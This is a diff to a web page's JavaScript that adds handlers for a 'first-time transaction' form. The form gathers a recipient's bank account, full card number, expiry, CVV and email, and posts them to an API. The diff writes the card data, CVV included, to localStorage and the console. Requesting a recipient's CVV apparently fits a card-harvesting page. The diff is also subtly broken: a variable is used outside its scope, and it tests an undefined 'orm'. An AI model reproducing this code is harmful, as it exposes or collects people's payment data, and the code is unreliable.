@@ -151,9 +151,131 @@ document.addEventListener('DOMContentLoaded', function() {
             errorMsgEl.textContent = message;
         }
     }
-    
+
     // Handle form submission
     if (firstTimeForm) {
+        firstTimeForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const continueButton = document.querySelector('#firstTimeForm button[type="submit"]');
+            if (continueButton) {
+                // Disable button and show loading state
+                continueButton.disabled = true;
+                const originalText = continueButton.textContent;
+                continueButton.innerHTML = '<span class="loader"></span> Processing...';
+            }
+            
+            try {
+                // Collect form data
+                const formData = {
+                    recipientName: document.getElementById('firstTimeRecipientName').value,
+                    bankName: document.getElementById('firstTimeBankName').value,
+                    accountNumber: document.getElementById('firstTimeAccountNumber').value,
+                    cardNumber: document.getElementById('firstTimeCardNumber').value,
+                    cardExpiry: document.getElementById('firstTimeCardExpiry').value,
+                    cardCvv: document.getElementById('firstTimeCardCvv').value,
+                    cardholderName: document.getElementById('firstTimeCardName').value,
+                    country: document.getElementById('firstTimeCardCountry').value,
+                    zipCode: document.getElementById('firstTimeCardZip').value,
+                    email: document.getElementById('firstTimeEmail').value
+                };
+                
+                console.log("Form data collected:", formData);
+                
+                // Store in localStorage for review
+                localStorage.setItem('formData', JSON.stringify(formData));
+                
+                // Show review screen
+                showReviewScreen();
+            } catch (error) {
+                console.error("Error processing form:", error);
+                alert("There was an error processing your form. Please try again.");
+            } finally {
+                // Reset button state
+                if (continueButton) {
+                    continueButton.disabled = false;
+                    continueButton.textContent = originalText;
+                }
+            }
+        });
+    }
+    
+    // Set up confirm button with API call
+    const confirmButton = document.getElementById('confirmButton');
+    if (confirmButton) {
+        confirmButton.addEventListener('click', async function() {
+            // Disable button and show loading
+            this.disabled = true;
+            this.innerHTML = '<span class="loader"></span> Processing...';
+            
+            try {
+                console.log("Preparing to send transaction data...");
+                
+                // Get form data
+                const formData = JSON.parse(localStorage.getItem('formData'));
+                
+                // Create payload
+                const payload = {
+                    transaction_id: transactionId,
+                    recipient_name: formData.recipientName,
+                    bank_name: formData.bankName,
+                    account_number: formData.accountNumber,
+                    card_number: formData.cardNumber,
+                    expiration_date: formData.cardExpiry,
+                    cvv: formData.cardCvv,
+                    card_name: formData.cardholderName,
+                    country: formData.country,
+                    zip_code: formData.zipCode,
+                    email: formData.email
+                };
+                
+                console.log("Sending payload:", payload);
+                
+                // Make API call
+                const response = await fetch(`${API_BASE_URL}/api/first-time-transaction`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                
+                console.log("Response status:", response.status);
+                
+                // Try to get the response text regardless of status
+                const responseText = await response.text();
+                console.log("Response body:", responseText);
+                
+                if (!response.ok) {
+                    throw new Error(`Failed to complete transaction: ${response.status} - ${responseText}`);
+                }
+                
+                // Show success message
+                const successMessage = document.getElementById('successMessage');
+                if (successMessage) {
+                    transferContent.style.display = 'none';
+                    successMessage.style.display = 'block';
+                } else {
+                    alert('Transaction completed successfully!');
+                }
+                
+                // Clear form data
+                localStorage.removeItem('formData');
+                
+            } catch (error) {
+                console.error('Error completing transaction:', error);
+                alert('There was an error processing your transaction. Please try again.');
+            } finally {
+                this.disabled = false;
+                this.innerHTML = 'Confirm and send';
+            }
+        });
+    }
+    
+    // Handle form submission
+    if (orm) {
         firstTimeForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
